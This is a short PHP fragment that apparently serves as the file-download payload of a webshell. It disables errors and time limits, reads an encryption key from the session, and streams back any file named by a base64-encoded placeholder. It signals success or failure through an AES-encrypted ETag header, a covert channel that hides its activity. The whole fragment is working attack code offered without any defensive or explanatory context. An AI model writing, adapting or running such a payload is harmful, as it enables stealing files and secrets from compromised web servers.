
error_reporting(0);
$key = $_SESSION['key'];
session_write_close();

@set_time_limit(0);
@ignore_user_abort(1);
@ini_set('max_execution_time', 0);

$filename = base64_decode("__FILE__");
if (is_file($filename) && is_readable($filename)) {
    $filesize = filesize($filename);
    $data = "1". intval($filesize/1024);
    $data = openssl_encrypt($data, "aes-256-ecb", $key);
    header('ETag: "' . $data . '"');

    $read_buffer = 4096;
    $handle = fopen($filename, 'rb');
    $sum_buffer = 0;
    while (!feof($handle) && $sum_buffer < $filesize) {
        echo fread($handle, $read_buffer);
        $sum_buffer += $read_buffer;
    }
    fclose($handle);
} else {
    $data = openssl_encrypt("0", "aes-256-ecb", $key);
    header('ETag: "' . $data . '"');
}
